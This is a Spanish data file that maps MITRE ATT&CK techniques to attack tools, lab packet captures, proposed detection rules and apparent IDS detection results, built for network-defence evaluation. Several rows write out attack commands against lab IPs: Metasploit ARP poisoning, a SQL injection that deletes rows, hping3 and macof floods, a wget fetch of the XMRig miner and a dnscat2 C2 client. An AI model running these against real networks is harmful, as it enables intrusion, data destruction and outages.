Reconnaissance;-;TA0043;Active Scanning;T1595;Vulnerability Scanning;T1595.002;Escaneo de vulnerabilidades;nmap;T1595.002-Port_Scanning_[3].pcapng;1;1000;0;SI;Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes;Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP);Manual [3] / 3.8.2;Manual [3] / 3.8.2.4;Manual [3] / 3.8.2.5;1;1;0;1;0;1;1;0.00;48;0.05;49;0.05;53;0.05;"""El ataque consiste en la ejecución de un comando nmap que escanea los 1000 puertos más comunes. Snort detecta que se esta realizando un analisis con nmap de puertos (SID 2009358) . Además, detecta posibles escaneo en diferentes rangos de puertos. Ejemplo: SID 2002910. Para el caso de FortiGate, sólo saltan 19 alertas, cada una avisando de un intento de descubrimiento de puerto particular""";19;0.02;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Envenenamiento ARP;Arpspoof;T1557.002-ARP_poisoning1_[2].pcapng;1;1;0;NO;-;Envenenamiento de tablas ARP mediante Arpspoof.;Manual [2] / 3.4.1.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Envenenamiento ARP;Metasploit;T1557.002-ARP_poisoning2_[3].pcapng;1;1;0;NO;-;"""Se realiza un ataque MITM, mediante el envenanamiento de las tablas de ARP caché de un equipo y su gateway. De esta toda se redirige todo el tráfico para que pase a través del equipo del atacante. Comando: msfconsole -x ""use auxiliary/spoof/arp/arp_poisoning; set BIDIRECTIONAL true; set interface eth1; set DHOSTS 192.168.1.2; set SHOSTS 192.168.1.1; run -j -z; sleep 5; kill 0; exit""""";Manual [3] / 3.8.19;Manual [3] / 3.8.19;Manual [3] / 3.8.19.5;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Suplantación ARP;arpspoof;T1557-Arp_spoof_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 3.2;Manual [1] / E.3;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;DHCP Spoofing;T1557.003;DHCP Spoofing;"""DHCPig, servidor DHCP""";T1557-Dhcp_spoofing_[1].pcapng;1;1;0;SI;"""Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK). Otra alternativa es una regla personalizada que analice mensajes DHCP ACK con direcciones IP de servidores DNS distinta a la establecida en la red""";-;Manual [1] / 2.4.2.1.2;Manual [1] / E.19;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Agujero 196;ettercap;T1557-Hole196_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 2.1.2.1.1;Manual [1] / E.28;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;-;-;Suplantación del puente raíz;yersinia;T1557-Puente_raiz_[1].pcapng;1;1;0;NO**;"""Si el ataque viene seguido de suplantaciones ARP, con el uso de preprocesadores de Snort resulta posible su detección. En caso de que el ataque se centre únicamente en el establecimiento del atacante como puente raíz, no existe mecanismo de detección""";Establecimiento de atacante como puente raíz;Manual [1] / 2.1.4.1.2;Manual [1] / E.6;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;-;-;Redirección;"""ettercap, netwox""";T1557-Redireccion_[1].pcapng;1;1;0;NO**;Regla personalizada que detecte envío de paquetes ICMP Redirect por parte de un equipo que no debería intervenir en labores de redirección;-;Manual [1] / 2.2.2.1.3;Manual [1] / E.8;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Forced Authentication;T1187;-;-;Forzar intento de autenticación en un servidor para obtener credenciales de acceso;"""SMB, NTLMssp-Extract""";"""T1187-Forced_Authentication_[5].pcapng, T1187-Forced_Authentication2_[5].pcapng""";1;3;0;SI;"""Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV""";Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas;Manual [5] / 3.5.5.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;3;1.00;3;1.00;Cada instancia de ataque se corresponde con una solicitud al server SMB con el usuario y contraseñas en el paquete;0;0.00;1
Credential Access;-;TA0006;OS Credential Dumping;T1003;DCSync;T1003.006;Obtención de credenciales del usuario krbtgt (Usuario Kerberos Active Directory);mimikazt;T1003-Os_credential_dumping_dcsync_[4].pcapng;1;1;0;SI;Regla compuesta que detecte una llamada DCERPC Bind a la API DRSUAPI seguida de una llamada a la función DsGetNCChanges;-;Manual [4] / 3.11;Manual [4] / B.11;Manual [4] / 4.11;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Collection;-;TA0009;Data from Configuration Repository;T1602;SNMP (MIB Dump);T1602.001;Recogida MIB de un equipamiento;Metasploit;T1602.001-MIB_Dump_[2].pcapng;1;1;0;SI;Regla genérica que detecte el uso del protocolo SNMP sobre UDP para acceder a la comunidad public;"""Este ataque obtiene informacion de la MIB de un equipo mediante peticiones SNMP. Comando: msfconsole -x ""use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.2.2; run; exit""""";Manual [2] / 3.1.8.1;Manual [2];Manual [2] / 4.2.1.10;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Collection;-;TA0009;Data from Information Repositories;T1213;-;-;Inyección SQL;Sqlmap;T1213-SQL_inyection_[3].pcapng;1;1;0;NO;-;Robar informacion de la victima obteniendo el contenido guardado en una tabla SQL. Comando: SELECT * FROM tabla;Manual [3] / 3.8.6;Manual [3] / 3.8.6.4;Manual [3] / 3.8.6.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Collection;-;TA0009;Data from Network Shared Drive;T1039;-;-;Descarga de archivos de interés disponibles en una red compartida;Comando Net Use;T1039-Data_from_network_shared_drive_[4].pcapng;1;1;0;NO;"""Detección por anomalías, copia repentina de ficheros compartidos por red.""";-;Manual [4] / 3.15;Manual [4] / B.15;Manual [4] / 4.15;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Collection;-;TA0009;Email Collection;T1114;Remote Email Collection;T1114.002;Recolección de correos electrónicos de un servidor Microsoft Exchange haciendo uso de credenciales robadas;PowerShell;T1114-Email_collection_remote_email_collection_[4].pcapng;1;1;0;NO;"""Detección por anomalías, peticiones LDAP espontáneas desde un equipo de la red, haciendo uso de una cuenta con credenciales válidas.""";-;Manual [4] / 3.16;Manual [4] / B.16;Manual [4] / 4.16;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Data Manipulation;T1565;Stored Data Manipulation;T1565.001;Inyección SQL;Sqlmap;T1565.001-SQL_inyection_[3].pcapng;1;1;0;NO***;"Reglas personalizadas que detecten ataques de inyeccion SQL mediante la presencia del caracter ""%27""";"""El objetivo es generar daño en la BBDD. Queremos borrar lineas de una tabla. Comando: http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20DELETE%20FROM%20contactos%20WHERE%20num=3--""";Manual [3] / 3.8.8;Manual [3] / 3.8.8.4;Manual [3] / 3.8.8.5;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;Denegación de servicio a servidor web;Metasploit;T1499.001-OS_Exhaustion_Flood_[3].pcapng;1;1;0;NO;-;Uso de metasploit para ataque DoS con herramienta Slowloris. Comando: use auxiliary/dos/http/slowloris;Manual [3] / 3.8.16;Manual [3] / 3.8.16.4;Manual [3] / 3.8.16.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Endpoint Denial of Service;T1499;Application or System Exploitation;T1499.004;Suplantación MAC;ip;T1499-Mac_spoof_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 2.1.1.1.2;Manual [1] / E.2;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Reseteo de Conexión;"""ettercap, netwox, nping""";T1499-Reseteo_[1].pcapng;1;1;0;NO;Detección por anomalías que identifique reseteos de conexión periódicos y desde direcciones sospechosas;-;Manual [1] / 2.3.1.1.6;Manual [1] / E.12;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;Inundación SYN con suplantación;hping3;T1499-Syn_suplantacion_[1].pcapng;1;1;0;SI;Regla genérica que detecte el envío prolongado de mensajes TCP SYN que dejan los sockets del equipo a proteger en estado SYN-RECV (no se terminan los handshake de las conexiones TCP establecidas);-;Manual [1] / 2.3.1.1.3;Manual [1] / E.9;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;LAND;hping3;T1499-Land_[1].pcapng;1;1;0;SI;Regla genérica que detecte envío de mensajes TCP SYN procedentes de la misma dirección IP a la que van dirigidos los paquetes. Los puertos origen/destino pueden ser incluso idénticos;-;Manual [1] / 2.3.1.1.5;Manual [1] / E.11;-;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Inundación DHCP / Inanición;"""DHCPig, yersinia""";T1499-Dhcp_flood_[1].pcapng;;1;0;SI;"""Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK)""";-;Manual [1] / 2.4.2.1.1;Manual [1] / E.18;Manual [4] / 4.1.39;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Reflexión SYN-ACK;hping3;T1499-Reflexion_synack_[1].pcapng;;1;0;SI;Regla que detecte el envío de mensajes TCP SYN-ACK no solicitados previamente por el la red a proteger;-;Manual [1] / 3.4.2;Manual [1] / E.10;-;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Envio solicitudes HTTP a baja tasa;Slowhttptest;T1499.02-Slowhttptest-C2018_[6].pcapng;;1;0;SI;Regla que detecte el envío de mensajes HTTP a baja tasa;Uso de Slowhttptest para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Envio solicitudes HTTP parciales;Slowloris;T1499.02-Slowloris-C2018_[6].pcapng;;1;0;SI;Regla que detecte el envío de mensajes HTTP parciales o uso de Slowloris;Uso de Slowloris para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;1;1.00;1
Impact;.;TA0040;Endpoint Denial of Service;T1499;Application Exhaustion Flood;T1499.003;Denegación de servicio a servidor web;Hulk;T1499.03-Hulk-C2018_[6].pcapng;;1;0;SI;Reglas que detecen envío masivo de solicitudes a servidor web;Uso de Hulk para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;.;TA0040;Endpoint Denial of Service;T1499;Application Exhaustion Flood;T1499.003;Denegación de servicio a servidor web;GoldenEye;T1499.03-GoldenEye-C2018_[6].pcapng;;1;0;SI;Reglas que detecen envío masivo de solicitudes a servidor web;Uso de GoldenEye para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación tabla MAC;Macof;T1498.001-MAC_table_flood_[3].pcapng;;1;0;NO;-;Inundacion tabla MAC mediante Macof. Comando: sudo macof -i enp0s9 -d 172.16.1.1;Manual [3] / 3.8.18;Manual [3] / 3.18.4;Manual [3] / 3.18.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-UDP_flood_1-C2018_[6].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo;-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-UDP_flood_2-C2018_[6].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo;-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación HTTP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-HTTP_flood-C2018_[6].pcapng;;1;0;SI;Regla que detecte envío masivo de mensajes HTTP;-;Dataset CIC-2018;Manual [4] / B.37;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación TCP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-TCP_flood-C2018_[6].pcapng;;1;0;SI;Regla que detecte envío masivo de mensajes TCP;-;Dataset CIC-2018;Manual [4] / B.37;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Caldera, hping3""";T1498.001-UDP_flood_[2].pcapng;;1;0;NO;-;Inundacion UDP en la red de la víctima. Comando: timeout 10s hping3 --udp --flood 192.168.2.2;Manual [2] / 3.1.10.2;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Amplificación DNS;dnsdrdos;T1498-Amplif_dns_[1].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de respuestas DNS no solicitadas con un mismo nombre resuelto hacia la red protegida;-;Manual [1] / 3.5.1;Manual [1] / E.14;Manual [4] / 4.1.35;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;1;1.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Fraggle;hping3;T1498-Fraggle_[1].pcapng;;1;0;SI;"""Regla genérica que detecte un envío masivo de datagramas UDP hacia un puerto concreto, con fin de saturarlo y causar su inoperatividad""";-;Manual [1] / 3.4.5;Manual [1] / E.13;Manual [4] / 4.1.36;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Smurf;hping3;T1498-Smurf_[1].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de respuestas ICMP;-;Manual [1] / 3.3.1;Manual [1] / E.7;Manual [4] / 4.1.37;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;-;-;Inundación de TCBPDU;yersinia;T1498-Tcbpdu_[1].pcapng;;1;0;NO;-;-;Manual [1] / 3.2.2;Manual [1] / E.5;Manual [4] / 4.1.38;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Resource Hijacking;T1496;-;-;Descarga y puesta en marcha de software de criptominado;XMRIG;T1496-Cryptomining_[2].pcapng;;1;0;NO;-;"""Instalacion y uso de software de minado. Comando: wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;""";Manual [2] / 3.3.2.1;Manual [2];Manual [2] / 4.2.2.3;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Defacement;T1491;Internal Defacement;T1491.001;Modificar fondo de pantalla equipo victima;PowerShell;T1491.001-Internal_Defacement_[5].pcapng;;1;0;NO;Detectable por listas negras/anomalías;Modificar fondo de pantalla equipo victima;Manual [5] / 3.5.10.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Application Layer Protocol;T1071;DNS;T1071.004;Command - Control via DNS;dnscat2;T1071-Tunel_[1].pcapng;;1;0;SI;Regla genérica que detecta uso de dnscat;"""Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption""";Manual [1] / 5.2.3;Manual [1] / E.17;Manual [4] / 4.1.30;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Command and Control;-;TA0040;Multi-Stage Channels;T1104;-;-;Sesión Remota + Ataque C2;"""RDP, Covenant""";T1104-Multi_stage_channels_[4].pcapng;;1;1;NO;Detección por anomalías. Investigación de las sesiones establecidas en el equipo atacante (siempre que sea posible) para identificar un rastro de otra dirección.;"""Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption""";Manual [4] / 3.22;Manual [4] / B.22;Manual [4] / 4.22;1;0;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Fallback Channels;T1008;-;-;Traspaso de canal primario C2 a canal alternativo;Covenant;T1008-Fallback_channels_[4].pcapng;;1;0;SI*;"""La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el cortafuegos.""";-;Manual [4] / 3.19;Manual [4] / B.19;Manual [4] / 4.19;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Command and Control;-;TA0040;Web Service;T1102;One-Way Communication;T1102.003;Subida de información confidencial a Workspace de Google Drive;"""Covenant, Google Drive API""";T1102.003-Web_service-one_way_communication_[4].pcapng;;1;1;NO;"""Detección por anomalías, observando actividad inusual relacionada con el uso de servicios web (subidas pesadas de información a la nube, comunicación periódica con servidores web concretos, etc)""";-;Manual [4] / 3.21;Manual [4] / B.21;Manual [4] / 4.21;1;1;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Proxy;T1090;Internal Proxy;T1090.001;Uso de Equipo interno como Proxy para el ataque C2;Covenant;T1090-Proxy_internal_proxy_[4].pcapng;;1;1;NO;"""Aunque sí es detectable la conexión C2 directa con el atacante, no existe un mecanismo de detección concreto que pueda identificar el uso de un proxy, más allá de una detección por anomalías, como la repetición de paquetes, dando a entender que un equipo interno está replicando paquetes, y por tanto está actuando como proxy""";-;Manual [4] / 3.20;Manual [4] / B.20;Manual [4] / 4.20;1;1;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Data Obfuscation;T1001;Protocol Impersonation;T1001.003;Falsificación de protocolos de conexión segura como SSL o TLS;FakeTLS (raykaryshyn Github);T1001.003-Data_obfuscation_protocol_impersonation_[4].pcapng;;1;0;NO*;Regla personalizada que compruebe el campo Server Name y mediante DNS asegure si se corresponde con la dirección IP a la que se está accediendo.;-;Manual [4] / 3.17;Manual [4] / B.17;Manual [4] / 4.17;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Command and Control;-;TA0040;Data Obfuscation;T1001;Steganography;T1001.002;Inserción de información confidencial en una imagen JPG;"""Covenant, SSH, scp, Powershell""";T1001.002-Data_obfuscation_steganography_[4].pcapng;;1;0;NO;"""Detección por anomalías y/o estegoanálisis, envío de imágenes o ficheros con formato poco común entre equipos, existencia de ficheros comprimidos sospechosos, etc.""";-;Manual [4] / 3.18;Manual [4] / B.18;Manual [4] / 4.18;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;0
Command and Control;-;TA0040;Ingress Tool Transfer;T1105;-;-;Transferencia de archivos de un servidor C2 a un equipo previamente comprometido;"""Metasploit, FTP""";T1105-Ingress_Tool_Transfer_[5].pcapng;;1;0;SI;"""Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.""";"""Servidor FTP en el servidor C2. A través de la conexión del atacante a la víctima, usando el comando ftp transferimos herramientas desde el servidor C2 a la víctima""";Manual [5] / 3.5.8.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
